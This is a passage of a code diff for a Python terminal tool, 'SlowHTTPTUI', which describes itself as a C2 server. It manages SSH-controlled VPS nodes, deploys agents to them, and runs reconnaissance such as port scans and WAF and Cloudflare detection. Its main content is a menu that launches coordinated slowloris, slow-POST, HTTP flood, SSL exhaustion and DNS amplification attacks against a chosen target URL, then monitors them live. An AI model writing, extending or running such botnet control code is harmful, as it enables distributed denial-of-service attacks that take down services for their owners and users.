-        print(f"Filtered ports: {len(results['filtered_ports'])}")
-        
-        if results["open_ports"]:
-            print(f"\n{Colors.BOLD}OPEN PORTS:{Colors.RESET}")
-            print(f"{'Port':<10} {'Service':<20}")
-            print("-" * 30)
-            
-            for port_info in results["open_ports"]:
-                print(f"{port_info['port']:<10} {port_info['service']:<20}")
-        else:
-            print(f"\n{Colors.YELLOW}No open ports found{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def ssl_checker_tool(self):
-        """SSL/TLS certificate checker tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}SSL/TLS CERTIFICATE CHECKER{Colors.RESET}")
-        print("=" * 50)
-        
-        domain = self.terminal.input_with_prompt("Enter domain name: ")
-        if not domain:
-            return
-        
-        port = self.terminal.input_with_prompt("Enter port [443]: ", False, validate_func=self.security_manager.validate_port) or "443"
-        port = int(port)
-        
-        print(f"\n{Colors.CYAN}[INFO] Checking SSL certificate for {domain}:{port}...{Colors.RESET}")
-        results = self.network_tools.check_ssl(domain, port)
-        
-        if not results["has_ssl"]:
-            print(f"\n{Colors.RED}[ERROR] No SSL/TLS certificate found{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.BOLD}SSL/TLS CERTIFICATE INFORMATION:{Colors.RESET}")
-        
-        # Certificate subject
-        if "subject" in results["certificate"]:
-            print(f"\n{Colors.BOLD}Subject:{Colors.RESET}")
-            for key, value in results["certificate"]["subject"].items():
-                print(f"  {key}: {value}")
-        
-        # Certificate issuer
-        if "issuer" in results["certificate"]:
-            print(f"\n{Colors.BOLD}Issuer:{Colors.RESET}")
-            for key, value in results["certificate"]["issuer"].items():
-                print(f"  {key}: {value}")
-        
-        # Validity
-        if "not_before" in results["certificate"] and "not_after" in results["certificate"]:
-            print(f"\n{Colors.BOLD}Validity:{Colors.RESET}")
-            print(f"  Not Before: {results['certificate']['not_before']}")
-            print(f"  Not After: {results['certificate']['not_after']}")
-        
-        # TLS version
-        if "tls_version" in results["certificate"]:
-            print(f"\n{Colors.BOLD}TLS Version:{Colors.RESET}")
-            print(f"  {results['certificate']['tls_version']}")
-        
-        # Cipher
-        if "cipher" in results["certificate"]:
-            print(f"\n{Colors.BOLD}Cipher:{Colors.RESET}")
-            print(f"  {results['certificate']['cipher']}")
-        
-        # Vulnerabilities
-        if results["vulnerabilities"]:
-            print(f"\n{Colors.BOLD}{Colors.RED}Vulnerabilities:{Colors.RESET}")
-            for vuln in results["vulnerabilities"]:
-                print(f"  - {vuln}")
-        else:
-            print(f"\n{Colors.GREEN}No vulnerabilities detected{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def target_info_tool(self):
-        """Target information gathering tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}TARGET INFORMATION GATHERING{Colors.RESET}")
-        print("=" * 50)
-        
-        target = self.terminal.input_with_prompt("Enter target (domain or IP): ")
-        if not target:
-            return
-        
-        print(f"\n{Colors.CYAN}[INFO] Gathering information about {target}...{Colors.RESET}")
-        results = self.network_tools.gather_target_info(target)
-        
-        print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
-        print(f"Domain: {results['domain']}")
-        
-        # IP addresses
-        print(f"\n{Colors.BOLD}IP Addresses:{Colors.RESET}")
-        for ip in results['ip_addresses']:
-            print(f"  - {ip}")
-        
-        # Web server
-        if results['web_server']:
-            print(f"\n{Colors.BOLD}Web Server:{Colors.RESET}")
-            print(f"  {results['web_server']}")
-        
-        # WAF detection
-        waf_status = f"{Colors.RED}Yes - {results['waf_type']}{Colors.RESET}" if results['waf_detected'] else f"{Colors.GREEN}No{Colors.RESET}"
-        print(f"\n{Colors.BOLD}WAF Detected:{Colors.RESET} {waf_status}")
-        
-        # Cloudflare protection
-        cf_status = f"{Colors.RED}Yes{Colors.RESET}" if results['cloudflare_protected'] else f"{Colors.GREEN}No{Colors.RESET}"
-        print(f"{Colors.BOLD}Cloudflare Protected:{Colors.RESET} {cf_status}")
-        
-        # Open ports
-        if results['open_ports']:
-            print(f"\n{Colors.BOLD}Open Ports:{Colors.RESET}")
-            print(f"{'Port':<10} {'Service':<20}")
-            print("-" * 30)
-            
-            for port_info in results['open_ports']:
-                print(f"{port_info['port']:<10} {port_info['service']:<20}")
-        
-        # DNS records
-        if results['dns_records']:
-            print(f"\n{Colors.BOLD}DNS Records:{Colors.RESET}")
-            for record_type, values in results['dns_records'].items():
-                print(f"\n{record_type} Records:")
-                if values:
-                    for value in values:
-                        print(f"  {value}")
-                else:
-                    print("  No records found")
-        
-        # SSL info
-        if results['ssl_info']:
-            print(f"\n{Colors.BOLD}SSL Certificate:{Colors.RESET}")
-            if "issuer" in results['ssl_info']:
-                issuer = results['ssl_info']['issuer']
-                if 'O' in issuer:
-                    print(f"  Issuer: {issuer['O']}")
-            
-            if "not_after" in results['ssl_info']:
-                print(f"  Expires: {results['ssl_info']['not_after']}")
-        
-        # WHOIS info
-        if results['whois_info']:
-            print(f"\n{Colors.BOLD}WHOIS Information:{Colors.RESET}")
-            print(f"  Registrar: {results['whois_info'].get('registrar', 'Unknown')}")
-            print(f"  Creation Date: {results['whois_info'].get('creation_date', 'Unknown')}")
-            print(f"  Expiration Date: {results['whois_info'].get('expiration_date', 'Unknown')}")
-        
-        # Save option
-        print(f"\n{Colors.YELLOW}Would you like to save this information to the database? (y/N){Colors.RESET}")
-        save_choice = input().strip().lower()
-        
-        if save_choice == 'y':
-            target_id = self.db_manager.save_target_info(results['domain'], results)
-            if target_id:
-                print(f"{Colors.GREEN}[SUCCESS] Target information saved to database{Colors.RESET}")
-            else:
-                print(f"{Colors.RED}[ERROR] Failed to save target information{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def system_status_menu(self):
-        """Menu for system status"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
-        print("=" * 20)
-        
-        # VPS Statistics
-        vps_list = self.db_manager.get_all_vps()
-        online_count = sum(1 for vps in vps_list if vps['status'] == 'online')
-        offline_count = len(vps_list) - online_count
-        
-        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
-        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
-        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
-        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
-        
-        # Attack Statistics
-        sessions = self.db_manager.get_attack_sessions()
-        active_attacks = len(self.attack_manager.active_attacks)
-        completed_attacks = sum(1 for s in sessions if s['status'] == 'completed')
-        failed_attacks = sum(1 for s in sessions if s['status'] == 'failed')
-        
-        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
-        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
-        print(f"Active Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
-        print(f"Completed Attacks: {Colors.GREEN}{completed_attacks}{Colors.RESET}")
-        print(f"Failed Attacks: {Colors.YELLOW}{failed_attacks}{Colors.RESET}")
-        
-        # SSH Connections
-        ssh_connections = len(self.ssh_manager.connections)
-        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
-        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
-        print(f"Cached Credentials: {Colors.CYAN}{len(self.ssh_manager.connection_cache)}{Colors.RESET}")
-        
-        # System Information
-        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
-        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
-        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
-        print(f"Mode: {Colors.RED}ADVANCED EDITION v{VERSION}{Colors.RESET}")
-        print(f"Python Version: {Colors.CYAN}{sys.version.split()[0]}{Colors.RESET}")
-        print(f"Platform: {Colors.CYAN}{sys.platform}{Colors.RESET}")
-        
-        # System resources
-        if PSUTIL_AVAILABLE:
-            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
-            print(f"CPU Usage: {Colors.CYAN}{psutil.cpu_percent()}%{Colors.RESET}")
-            print(f"Memory Usage: {Colors.CYAN}{psutil.virtual_memory().percent}%{Colors.RESET}")
-            print(f"Disk Usage: {Colors.CYAN}{psutil.disk_usage('/').percent}%{Colors.RESET}")
-        
-        # Module availability
-        print(f"\n{Colors.BOLD}MODULE AVAILABILITY:{Colors.RESET}")
-        print(f"SSH (paramiko): {Colors.GREEN if SSH_AVAILABLE else Colors.RED}{SSH_AVAILABLE}{Colors.RESET}")
-        print(f"Crypto: {Colors.GREEN if CRYPTO_AVAILABLE else Colors.RED}{CRYPTO_AVAILABLE}{Colors.RESET}")
-        print(f"Requests: {Colors.GREEN if REQUESTS_AVAILABLE else Colors.RED}{REQUESTS_AVAILABLE}{Colors.RESET}")
-        print(f"DNS: {Colors.GREEN if DNS_AVAILABLE else Colors.RED}{DNS_AVAILABLE}{Colors.RESET}")
-        print(f"PSUtil: {Colors.GREEN if PSUTIL_AVAILABLE else Colors.RED}{PSUTIL_AVAILABLE}{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def _format_bytes(self, bytes_value):
-        """Format bytes to human-readable format"""
-        if bytes_value is None:
-            return "0 B"
-            
-        if bytes_value > 1024*1024*1024:
-            return f"{bytes_value/(1024*1024*1024):.2f} GB"
-        elif bytes_value > 1024*1024:
-            return f"{bytes_value/(1024*1024):.2f} MB"
-        elif bytes_value > 1024:
-            return f"{bytes_value/1024:.2f} KB"
-        else:
-            return f"{bytes_value} B"
-    
-    def run(self):
-        """Run the main application loop"""
-        while self.running:
-            try:
-                self.terminal.clear_screen()
-                self.terminal.print_banner(VERSION)
-                self.print_main_menu()
-                
-                choice = input().strip()
-                
-                if choice == '1':
-                    self.vps_management_menu()
-                elif choice == '2':
-                    self.launch_attack_menu()
-                elif choice == '3':
-                    self.monitor_attack()
-                elif choice == '4':
-                    self.attack_history_menu()
-                elif choice == '5':
-                    self.network_recon_menu()
-                elif choice == '6':
-                    self.system_status_menu()
-                elif choice == '0':
-                    print(f"{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
-                    break
-                else:
-                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
-                    time.sleep(1)
-                    
-            except KeyboardInterrupt:
-                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
-                break
-            except Exception as e:
-                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-                logger.error(f"Runtime error: {str(e)}")
-                logger.error(traceback.format_exc())
-                input("Press Enter to continue...")
-    
     def view_vps_details(self):
-        """View detailed information about a VPS node"""
+        """View VPS details"""
         vps_list = self.db_manager.get_all_vps()
         
         if not vps_list:
@@ -1872,7 +4416,7 @@ class SlowHTTPTUI:
         print("-" * 20)
         
         for i, vps in enumerate(vps_list, 1):
-            print(f"{i}. {vps['ip_address']} ({vps['username']}@{vps['ip_address']}:{vps['ssh_port']})")
+            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
         
         try:
             choice = self.terminal.input_with_prompt("Select VPS number: ")
@@ -1884,189 +4428,38 @@ class SlowHTTPTUI:
                 vps = vps_list[idx]
                 
                 self.terminal.clear_screen()
-                print(f"\n{Colors.BOLD}VPS DETAILS: {vps['ip_address']}{Colors.RESET}")
+                print(f"{Colors.BOLD}VPS DETAILS: {vps['ip_address']}{Colors.RESET}")
                 print("=" * 50)
                 
-                # Basic info
-                print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
+                print(f"ID: {vps['id']}")
                 print(f"IP Address: {vps['ip_address']}")
                 print(f"Username: {vps['username']}")
                 print(f"SSH Port: {vps['ssh_port']}")
-                status_color = Colors.GREEN if vps['status'] == 'online' else Colors.RED
-                print(f"Status: {status_color}{vps['status']}{Colors.RESET}")
+                print(f"Status: {vps['status']}")
                 print(f"Location: {vps['location'] or 'Unknown'}")
-                print(f"Added: {vps['created_at'][:19] if vps['created_at'] else 'Unknown'}")
-                print(f"Last Seen: {vps['last_seen'][:19] if vps['last_seen'] else 'Never'}")
+                print(f"Created At: {vps['created_at']}")
+                print(f"Last Seen: {vps['last_seen'] or 'Never'}")
+                
+                # System info
+                if vps.get('system_info'):
+                    try:
+                        system_info = json.loads(vps['system_info'])
+                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
+                        for key, value in system_info.items():
+                            print(f"  {key.capitalize()}: {value}")
+                    except:
+                        print(f"\n{Colors.YELLOW}[WARNING] Could not parse system information{Colors.RESET}")
                 
                 # Tags
-                if vps['tags']:
+                if vps.get('tags'):
                     try:
                         tags = json.loads(vps['tags'])
                         if tags:
-                            print(f"Tags: {', '.join(tags)}")
+                            print(f"\n{Colors.BOLD}TAGS:{Colors.RESET}")
+                            for tag in tags:
+                                print(f"  - {tag}")
                     except:
                         pass
-                
-                # System info
-                system_info = {}
-                if vps['system_info']:  # system_info column
-                    try:
-                        system_info = json.loads(vps['system_info'])
-                    except:
-                        system_info = {}
-                
-                if system_info:
-                    print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
-                    for key, value in system_info.items():
-                        print(f"{key.capitalize()}: {value}")
-                
-                # Last check result
-                if vps['last_check_result']:  # last_check_result column
-                    print(f"\n{Colors.BOLD}LAST CHECK RESULT:{Colors.RESET}")
-                    print(vps['last_check_result'])
-                
-                # Real-time status check
-                print(f"\n{Colors.BOLD}REAL-TIME STATUS CHECK:{Colors.RESET}")
-                if self.ssh_manager.get_connection_status(vps['ip_address']):
-                    print(f"{Colors.GREEN}Connection: ACTIVE{Colors.RESET}")
-                    
-                    # Check disk space
-                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "df -h / | tail -1 | awk '{print $5}'")
-                    if success:
-                        disk_usage = output.strip()
-                        print(f"Disk Usage: {disk_usage}")
-                    
-                    # Check memory
-                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "free -m | grep Mem | awk '{print $3,$2}'")
-                    if success:
-                        parts = output.strip().split()
-                        if len(parts) == 2:
-                            used, total = parts
-                            print(f"Memory: {used} MB used / {total} MB total")
-                    
-                    # Check load average
-                    success, output = self.ssh_manager.execute_command(vps['ip_address'], "uptime | awk -F'load average:' '{print $2}'")
-                    if success:
-                        load = output.strip()
-                        print(f"Load Average: {load}")
-                    
-                    # Check agent status
-                    agent_status = self.ssh_manager.check_agent_status(vps['ip_address'])
-                    if agent_status['status'] == 'running':
-                        print(f"{Colors.GREEN}Agent Status: RUNNING ({agent_status['processes']} processes){Colors.RESET}")
-                        
-                        # Get agent details
-                        if agent_status.get('details'):
-                            print(f"Agent Process: {agent_status['details']}")
-                        
-                        # Get agent stats
-                        if agent_status.get('stats'):
-                            stats = agent_status['stats']
-                            print(f"\n{Colors.BOLD}AGENT STATISTICS:{Colors.RESET}")
-                            for key, value in stats.items():
-                                if key == 'bytes_sent':
-                                    # Format bytes
-                                    if value > 1024*1024*1024:
-                                        print(f"Data Sent: {value/(1024*1024*1024):.2f} GB")
-                                    elif value > 1024*1024:
-                                        print(f"Data Sent: {value/(1024*1024):.2f} MB")
-                                    elif value > 1024:
-                                        print(f"Data Sent: {value/1024:.2f} KB")
-                                    else:
-                                        print(f"Data Sent: {value} bytes")
-                                elif key == 'uptime':
-                                    # Format uptime
-                                    if value > 3600:
-                                        print(f"Uptime: {value//3600}h {(value%3600)//60}m {value%60}s")
-                                    elif value > 60:
-                                        print(f"Uptime: {value//60}m {value%60}s")
-                                    else:
-                                        print(f"Uptime: {value}s")
-                                elif key == 'timestamp':
-                                    # Format timestamp
-                                    print(f"Last Update: {datetime.fromtimestamp(value).strftime('%Y-%m-%d %H:%M:%S')}")
-                                else:
-                                    print(f"{key.capitalize()}: {value}")
-                    else:
-                        print(f"{Colors.YELLOW}Agent Status: NOT RUNNING{Colors.RESET}")
-                else:
-                    print(f"{Colors.RED}Connection: INACTIVE{Colors.RESET}")
-                
-                # Notes
-                if vps['notes']:
-                    print(f"\n{Colors.BOLD}NOTES:{Colors.RESET}")
-                    print(vps['notes'])
-                
-                # Actions menu
-                print(f"\n{Colors.BOLD}ACTIONS:{Colors.RESET}")
-                print(f"{Colors.GREEN}[1]{Colors.RESET} Edit Notes")
-                print(f"{Colors.GREEN}[2]{Colors.RESET} Edit Tags")
-                print(f"{Colors.GREEN}[3]{Colors.RESET} Deploy Agent")
-                print(f"{Colors.GREEN}[4]{Colors.RESET} Test Connection")
-                print(f"{Colors.GREEN}[0]{Colors.RESET} Back")
-                
-                action = self.terminal.input_with_prompt("\nSelect action: ")
-                
-                if action == "1":
-                    # Edit notes
-                    current_notes = vps['notes'] or ""
-                    print(f"\n{Colors.BOLD}CURRENT NOTES:{Colors.RESET}")
-                    print(current_notes)
-                    new_notes = self.terminal.input_with_prompt("\nEnter new notes (leave empty to keep current): ", False)
-                    
-                    if new_notes:
-                        self.db_manager.update_vps_notes(vps['ip_address'], new_notes)
-                        print(f"{Colors.GREEN}Notes updated{Colors.RESET}")
-                
-                elif action == "2":
-                    # Edit tags
-                    current_tags = []
-                    if vps['tags']:
-                        try:
-                            current_tags = json.loads(vps['tags'])
-                        except:
-                            pass
-                    
-                    print(f"\n{Colors.BOLD}CURRENT TAGS:{Colors.RESET}")
-                    print(", ".join(current_tags) if current_tags else "No tags")
-                    
-                    new_tags = self.terminal.input_with_prompt("\nEnter new tags (comma-separated, leave empty to keep current): ", False)
-                    
-                    if new_tags:
-                        tags_list = [tag.strip() for tag in new_tags.split(',')]
-                        self.db_manager.update_vps_tags(vps['ip_address'], tags_list)
-                        print(f"{Colors.GREEN}Tags updated{Colors.RESET}")
-                
-                elif action == "3":
-                    # Deploy agent
-                    print(f"\n{Colors.BOLD}SELECT AGENT TYPE:{Colors.RESET}")
-                    print(f"{Colors.GREEN}[1]{Colors.RESET} Standard Agent")
-                    print(f"{Colors.GREEN}[2]{Colors.RESET} Advanced Agent")
-                    
-                    agent_choice = self.terminal.input_with_prompt("Select agent type [1]: ", False) or "1"
-                    agent_type = "advanced" if agent_choice == "2" else "standard"
-                    
-                    print(f"\n{Colors.CYAN}[DEPLOYING] {vps['ip_address']}...{Colors.RESET}")
-                    success, message = self.ssh_manager.deploy_agent(vps['ip_address'], agent_type)
-                    
-                    if success:
-                        print(f"{Colors.GREEN}[SUCCESS] Agent deployed successfully{Colors.RESET}")
-                    else:
-                        print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
-                
-                elif action == "4":
-                    # Test connection
-                    print(f"\n{Colors.CYAN}[TESTING] {vps['ip_address']}...{Colors.RESET}")
-                    success, message = self.ssh_manager.connect_vps(
-                        vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
-                    )
-                    
-                    if success:
-                        print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
-                        self.db_manager.update_vps_status(vps['ip_address'], 'online')
-                    else:
-                        print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
-                        self.db_manager.update_vps_status(vps['ip_address'], 'offline')
             else:
                 print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                 
@@ -2074,3007 +4467,964 @@ class SlowHTTPTUI:
             print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
         except Exception as e:
             print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-            logger.error(f"Error viewing VPS details: {str(e)}")
+        
+        input("Press Enter to continue...")
+    
+    def launch_attack_menu(self):
+        """Launch attack menu"""
+        self.terminal.clear_screen()
+        self.terminal.print_banner(VERSION)
+        
+        print(f"{Colors.BOLD}LAUNCH ATTACK{Colors.RESET}")
+        print("=" * 50)
+        
+        # Get online VPS nodes
+        vps_list = self.db_manager.get_all_vps()
+        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
+        
+        if not online_vps:
+            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        # Display available VPS nodes
+        print(f"\n{Colors.BOLD}AVAILABLE VPS NODES:{Colors.RESET}")
+        for i, vps in enumerate(online_vps, 1):
+            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
+        
+        try:
+            # Get attack parameters
+            session_name = self.terminal.input_with_prompt("Session Name: ")
+            if not session_name:
+                return
+            
+            target_url = self.terminal.input_with_prompt("Target URL (e.g., http://example.com): ")
+            if not target_url:
+                return
+            
+            # Add http:// if not present
+            if not target_url.startswith('http'):
+                target_url = 'http://' + target_url
+            
+            # Get attack type
+            attack_methods = self.attack_manager.get_available_attack_methods()
+            print(f"\n{Colors.BOLD}AVAILABLE ATTACK METHODS:{Colors.RESET}")
+            for i, (attack_id, attack_name) in enumerate(attack_methods.items(), 1):
+                print(f"{i}. {attack_name}")
+            
+            attack_choice = self.terminal.input_with_prompt("Select attack method (1-8): ")
+            if not attack_choice or not attack_choice.isdigit():
+                return
+            
+            attack_idx = int(attack_choice) - 1
+            if attack_idx < 0 or attack_idx >= len(attack_methods):
+                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            attack_type = list(attack_methods.keys())[attack_idx]
+            
+            # Select VPS nodes
+            vps_selection = self.terminal.input_with_prompt("Select VPS nodes (comma-separated numbers, 'all' for all): ")
+            if not vps_selection:
+                return
+            
+            selected_vps = []
+            if vps_selection.lower() == 'all':
+                selected_vps = [vps['ip_address'] for vps in online_vps]
+            else:
+                try:
+                    indices = [int(idx.strip()) - 1 for idx in vps_selection.split(',')]
+                    for idx in indices:
+                        if 0 <= idx < len(online_vps):
+                            selected_vps.append(online_vps[idx]['ip_address'])
+                except ValueError:
+                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+            
+            if not selected_vps:
+                print(f"{Colors.RED}No VPS nodes selected{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Get attack parameters
+            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
+            
+            connections = self.terminal.input_with_prompt("Connections per VPS [100]: ", False) or "100"
+            try:
+                connections = int(connections)
+                if connections < 1:
+                    raise ValueError("Connections must be positive")
+            except ValueError:
+                print(f"{Colors.RED}Invalid connections value{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            duration = self.terminal.input_with_prompt("Attack duration in seconds [300]: ", False) or "300"
+            try:
+                duration = int(duration)
+                if duration < 1:
+                    raise ValueError("Duration must be positive")
+            except ValueError:
+                print(f"{Colors.RED}Invalid duration value{Colors.RESET}")
+                input("Press Enter to continue...")
+                return
+            
+            # Additional parameters based on attack type
+            parameters = {
+                'connections': connections,
+                'duration': duration
+            }
+            
+            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
+                delay = self.terminal.input_with_prompt("Delay between requests in seconds [10]: ", False) or "10"
+                try:
+                    parameters['delay'] = float(delay)
+                except ValueError:
+                    print(f"{Colors.RED}Invalid delay value{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+            
+            if attack_type == 'http_flood':
+                requests = self.terminal.input_with_prompt("Requests per connection [1000]: ", False) or "1000"
+                try:
+                    parameters['requests'] = int(requests)
+                except ValueError:
+                    print(f"{Colors.RED}Invalid requests value{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+            
+            if attack_type == 'dns_amplification':
+                target_ip = self.terminal.input_with_prompt("Target IP address: ")
+                if not target_ip or not self.security_manager.validate_ip(target_ip):
+                    print(f"{Colors.RED}Invalid IP address{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
+                parameters['target_ip'] = target_ip
+            
+            # Confirm attack
+            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
+            print(f"Session Name: {session_name}")
+            print(f"Target URL: {target_url}")
+            print(f"Attack Type: {attack_methods[attack_type]}")
+            print(f"VPS Nodes: {len(selected_vps)}")
+            print(f"Connections per VPS: {connections}")
+            print(f"Duration: {duration} seconds")
+            
+            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
+            
+            if confirm == 'y':
+                # Create attack session in database
+                session_id = self.db_manager.create_attack_session(
+                    session_name, target_url, attack_type, selected_vps, parameters
+                )
+                
+                if session_id:
+                    # Launch attack
+                    success = self.attack_manager.launch_attack(
+                        session_id, target_url, attack_type, selected_vps, parameters
+                    )
+                    
+                    if success:
+                        print(f"{Colors.GREEN}[SUCCESS] Attack launched successfully{Colors.RESET}")
+                        
+                        # Ask if user wants to monitor the attack
+                        monitor = input(f"\n{Colors.YELLOW}Monitor this attack? (Y/n): {Colors.RESET}").strip().lower()
+                        
+                        if monitor != 'n':
+                            self.monitor_attack(session_id)
+                    else:
+                        print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[ERROR] Failed to create attack session{Colors.RESET}")
+            else:
+                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
+                
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error launching attack: {str(e)}")
+            logger.error(traceback.format_exc())
+        
+        input("Press Enter to continue...")
+    
+    def monitor_attacks_menu(self):
+        """Monitor active attacks menu"""
+        while self.running:
+            self.terminal.clear_screen()
+            self.terminal.print_banner(VERSION)
+            
+            print(f"{Colors.BOLD}ACTIVE ATTACKS{Colors.RESET}")
+            print("=" * 50)
+            
+            active_sessions = self.db_manager.get_active_attack_sessions()
+            
+            if active_sessions:
+                # Convert to list of lists for table printing
+                headers = ["ID", "Session Name", "Target", "Attack Type", "VPS", "Started", "Duration"]
+                data = []
+                
+                for session in active_sessions:
+                    vps_count = len(session['vps_nodes'].split(',')) if session['vps_nodes'] else 0
+                    start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
+                    
+                    # Calculate duration
+                    if session['start_time']:
+                        start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+                        duration = (datetime.now() - start).total_seconds()
+                        duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
+                    else:
+                        duration_str = 'N/A'
+                    
+                    data.append([
+                        session['id'],
+                        session['session_name'],
+                        session['target_host'] or session['target_url'],
+                        session['attack_type'],
+                        f"{vps_count} VPS",
+                        start_time,
+                        duration_str
+                    ])
+                
+                self.terminal.print_table(headers, data)
+                
+                menu = f"""
+{Colors.BOLD}MONITOR OPTIONS:{Colors.RESET}
+{Colors.GREEN}[1]{Colors.RESET} Monitor Attack
+{Colors.GREEN}[2]{Colors.RESET} Stop Attack
+{Colors.GREEN}[3]{Colors.RESET} View Attack Details
+{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
+
+{Colors.YELLOW}Select option (0-3): {Colors.RESET}"""
+                
+                print(menu)
+                choice = input().strip()
+                
+                if choice == '1':
+                    session_id = self.terminal.input_with_prompt("Enter session ID to monitor: ")
+                    if session_id and session_id.isdigit():
+                        self.monitor_attack(int(session_id))
+                elif choice == '2':
+                    session_id = self.terminal.input_with_prompt("Enter session ID to stop: ")
+                    if session_id and session_id.isdigit():
+                        self.stop_attack(int(session_id))
+                elif choice == '3':
+                    session_id = self.terminal.input_with_prompt("Enter session ID to view details: ")
+                    if session_id and session_id.isdigit():
+                        self.view_attack_details(int(session_id))
+                elif choice == '0':
+                    break
+                else:
+                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
+                    time.sleep(1)
+            else:
+                print(f"\n{Colors.YELLOW}No active attacks{Colors.RESET}")
+                input("Press Enter to continue...")
+                break
+    
+    def monitor_attack(self, session_id):
+        """Monitor a specific attack"""
+        session = self.db_manager.get_attack_session(session_id)
+        
+        if not session:
+            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        if session['status'] != 'running':
+            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
+        
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
+        print(f"Target: {session['target_url']}")
+        print(f"Attack Type: {session['attack_type']}")
+        print(f"VPS Nodes: {len(vps_list)}")
+        print("=" * 50)
+        
+        print(f"{Colors.YELLOW}Press Ctrl+C to stop monitoring{Colors.RESET}")
+        time.sleep(1)
+        
+        try:
+            monitoring = True
+            refresh_interval = 2  # seconds
+            
+            while monitoring:
+                self.terminal.clear_screen()
+                print(f"{Colors.BOLD}MONITORING ATTACK: {session['session_name']}{Colors.RESET}")
+                print(f"Target: {session['target_url']}")
+                print(f"Attack Type: {session['attack_type']}")
+                print(f"VPS Nodes: {len(vps_list)}")
+                
+                # Calculate duration
+                if session['start_time']:
+                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+                    duration = (datetime.now() - start).total_seconds()
+                    duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
+                    print(f"Duration: {duration_str}")
+                
+                print("=" * 50)
+                
+                # Get latest results
+                results = self.db_manager.get_attack_results(session_id, limit=len(vps_list) * 2)
+                
+                if results:
+                    # Group by VPS
+                    vps_results = {}
+                    for result in results:
+                        vps_ip = result['vps_ip']
+                        if vps_ip not in vps_results:
